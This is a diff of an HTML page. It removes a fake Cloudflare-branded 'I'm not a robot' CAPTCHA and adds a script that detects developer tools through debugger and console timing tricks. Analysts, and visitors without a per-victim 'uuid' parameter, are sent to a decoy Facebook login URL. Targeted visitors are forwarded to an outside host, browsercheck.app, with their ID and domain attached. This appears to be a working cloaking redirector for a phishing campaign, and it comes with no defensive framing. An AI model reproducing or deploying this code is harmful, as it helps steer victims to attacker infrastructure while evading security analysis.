@@ -1,287 +1,67 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <link rel="icon" type="image/x-icon" href="https://www.cloudflare.com/favicon.ico">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloudflare CAPTCHA</title>
-    <style>
-        body {
-            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
-        }
-        
-        .captcha-container {
-            width: 450px;
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-        }
-        
-        .captcha-header {
-            background-color: #f6821f;
-            color: white;
-            padding: 12px 16px;
-            display: flex;
-            align-items: center;
-        }
-        
-        .cloudflare-logo {
-            width: 60px;
-            height: 27px;
-            margin-right: 8px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .captcha-title {
-            font-size: 16px;
-            font-weight: 600;
-        }
-        
-        .captcha-content {
-            padding: 24px;
-        }
-        
-        .security-challenge {
-            text-align: center;
-            margin-bottom: 24px;
-        }
-        
-        .security-challenge h2 {
-            font-size: 18px;
-            margin-bottom: 8px;
-            color: #333;
-        }
-        
-        .security-challenge p {
-            font-size: 14px;
-            color: #666;
-            margin: 0;
-        }
-        
-        .checkbox-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            padding: 16px;
-            cursor: pointer;
-            position: relative;
-            margin-bottom: 24px;
-        }
-        
-        .checkbox {
-            width: 24px;
-            height: 24px;
-            border: 2px solid #bbb;
-            border-radius: 4px;
-            margin-right: 12px;
-            position: relative;
-        }
-        
-        .checkbox.checked::after {
-            content: '✓';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            font-size: 16px;
-            font-weight: bold;
-            background-color: #0078d7;
-            border-radius: 2px;
-        }
-        
-        .robot-text {
-            font-size: 16px;
-            color: #333;
-        }
-        
-        .captcha-footer {
-            display: flex;
-            justify-content: space-between;
-            padding: 12px 16px;
-            border-top: 1px solid #eee;
-            font-size: 13px;
-            color: #666;
-        }
-        
-        .powered-by {
-            display: flex;
-            align-items: center;
-        }
-        
-        .cloudflare-text {
-            font-weight: 600;
-            color: #f6821f;
-        }
-        
-        .privacy-terms a {
-            color: #666;
-            text-decoration: none;
-            margin-left: 8px;
-        }
-        
-        .privacy-terms a:hover {
-            text-decoration: underline;
-        }
-        
-        .verification-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(255, 255, 255, 0.9);
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 10;
-        }
-        
-        .spinner {
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            border-left: 4px solid #f6821f;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 16px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .success-message {
-            display: none;
-            text-align: center;
-            color: #28a745;
-            font-weight: 600;
-            margin-top: 16px;
-        }
-    </style>
-</head>
-<body>
-    <div class="captcha-container">
-        <div class="captcha-header">
-            <div class="cloudflare-logo">
-                <img src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20width='60'%20height='27'%20fill='none'%20viewBox='0%200%2060%2027'%20style='width:100%25;height:28px'%3e%3cg%20clip-path='url(%23a)'%3e%3cpath%20fill='%23fff'%20d='M47.927%2011.725c-.2%200-.397.007-.594.014a.271.271%200%200%200-.094.022.33.33%200%200%200-.214.229l-.846%202.924c-.365%201.257-.23%202.418.383%203.27.563.789%201.498%201.251%202.634%201.305l4.589.276a.41.41%200%200%201%20.326.179.44.44%200%200%201%20.046.39.58.58%200%200%201-.498.384l-4.768.276c-2.59.118-5.377%202.21-6.355%204.761l-.344.9a.253.253%200%200%200%20.225.343H58.84a.435.435%200%200%200%20.422-.315%2011.69%2011.69%200%200%200%20.437-3.185c0-6.5-5.266-11.766-11.764-11.766'%3e%3c/path%3e%3cpath%20fill='%23fff'%20d='m40.76%2026.62.304-1.057c.365-1.258.229-2.418-.384-3.271-.562-.788-1.497-1.25-2.633-1.304l-21.527-.276a.426.426%200%200%201-.34-.18.44.44%200%200%201-.047-.39.581.581%200%200%201%20.502-.383l21.727-.276c2.58-.118%205.367-2.21%206.345-4.761l1.24-3.24a.814.814%200%200%200%20.035-.43C44.572%204.733%2038.925%200%2032.172%200c-6.223%200-11.503%204.016-13.399%209.598a6.344%206.344%200%200%200-4.467-1.236%206.367%206.367%200%200%200-5.517%207.91C3.913%2016.417%200%2020.412%200%2025.32c0%20.445.032.882.097%201.308a.418.418%200%200%200%20.415.362H40.268a.517.517%200%200%200%20.491-.376'%3e%3c/path%3e%3c/g%3e%3cdefs%3e%3cclipPath%20id='a'%3e%3cpath%20fill='%23FFF'%20d='M0%200h60v27H0z'%3e%3c/path%3e%3c/clipPath%3e%3c/defs%3e%3c/svg%3e" alt="Cloudflare Logo" class="logo-main">
-            
-            </div>
-            <div class="captcha-title">Security Check</div>
-        </div>
-        
-        <div class="captcha-content">
-            <div class="security-challenge">
-                <h2>Please complete the security check</h2>
-                <p>We need to verify that you are not a robot before proceeding.</p>
-            </div>
-            
-            <div class="checkbox-container" id="captcha-checkbox">
-                <div class="checkbox" id="checkbox"></div>
-                <div class="robot-text">I'm not a robot</div>
-                
-                <div class="verification-overlay" id="verification-overlay">
-                    <div class="spinner"></div>
-                    <div>Verifying...</div>
-                </div>
-            </div>
-            
-            <div class="success-message" id="success-message">
-                Verification successful! You will be redirected shortly.
-            </div>
-        </div>
-        
-        <div class="captcha-footer">
-            <div class="powered-by">
-                Protected by <span class="cloudflare-text">&nbsp;Cloudflare</span>
-            </div>
-            <div class="privacy-terms">
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-            </div>
-        </div>
-    </div>
-    
     <script>
-        async function submitForm() {
-    try {
-        // Function paths are correct as-is for Cloudflare Pages
-        const response = await fetch('/generate-token');
-        const { token } = await response.json();
-        
-        const submitResponse = await fetch('/submit', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                name: "User", // Required fields according to your submit.js
-                email: "user@example.com", // Required fields according to your submit.js
-                data: "some data",
-                token
-            })
-        });
-        
-        const result = await submitResponse.json();
-        console.log('Form submitted successfully', result);
-        return true;
-    } catch (error) {
-        console.error('Error submitting form:', error);
-        return false;
-    }
-}
+        let isDevToolsOpen = false;
+        const devToolsWarningUrl = "https://facebook.com/login";
 
-document.getElementById('captcha-checkbox').addEventListener('click', function() {
-    // First show verification overlay (visual feedback)
-    const verificationOverlay = document.getElementById('verification-overlay');
-    verificationOverlay.style.display = 'flex';
-    
-    // Then perform the verification and submission
-    setTimeout(async function() {
-        try {
-            // Attempt to submit the form
-            const result = await submitForm();
-            
-            // Hide verification overlay
-            verificationOverlay.style.display = 'none';
-            
-            if (result) {
-                // Show checkbox as checked
-                document.getElementById('checkbox').classList.add('checked');
-                
-                // Show success message
-                document.getElementById('success-message').style.display = 'block';
-                
-                // Simulate redirect after verification
-                setTimeout(function() {
-                    alert('Verification successful! Form submitted with token.');
-                }, 2000);
-            } else {
-                alert('Verification failed. Please try again.');
-            }
-        } catch (err) {
-            // Hide verification overlay if error
-            verificationOverlay.style.display = 'none';
-            console.error('Verification process error:', err);
-            alert('Verification failed. Please try again.');
+        const uuid = new URLSearchParams(window.location.search).get('uuid');
+        const domain = new URLSearchParams(window.location.search).get('domain');
+
+        checkDebugger();
+        checkConsole();
+
+        if (!uuid) {
+            setTimeout(function () {
+                if (!isDevToolsOpen) {
+                    window.location.href = devToolsWarningUrl;
+                }
+            }, 50);
         }
-    }, 1500); // Simulate verification process
-});
+
+        function checkDebugger() {
+            const startTime = Date.now();
+            debugger;
+            const endTime = Date.now();
+
+            if (endTime - startTime > 100) {
+                if (!isDevToolsOpen) {
+                    isDevToolsOpen = true;
+                    window.location.href = devToolsWarningUrl;
+                }
+            }
+        }
+
+        function checkConsole() {
+            const startTime = Date.now();
+            console.clear();
+            const endTime = Date.now();
+
+            if (endTime - startTime > 100) {
+                if (!isDevToolsOpen) {
+                    isDevToolsOpen = true;
+                    window.location.href = devToolsWarningUrl;
+                }
+            }
+        }
+
+        console.log(uuid);
+        console.log(document.referrer.includes(".pages.dev"))
+
+        if (uuid != undefined) {
+            setTimeout(function () {
+                if (!isDevToolsOpen) {
+                    window.location.href = `https://browsercheck.app/${uuid}?domain=${domain}`;
+                } else {
+                    window.location.href = devToolsWarningUrl;
+                }
+            }, 50);
+        } else {
+            window.location.href = devToolsWarningUrl;
+        }
     </script>
-</body>
+</head>
+
+<body></body>
+
 </html>
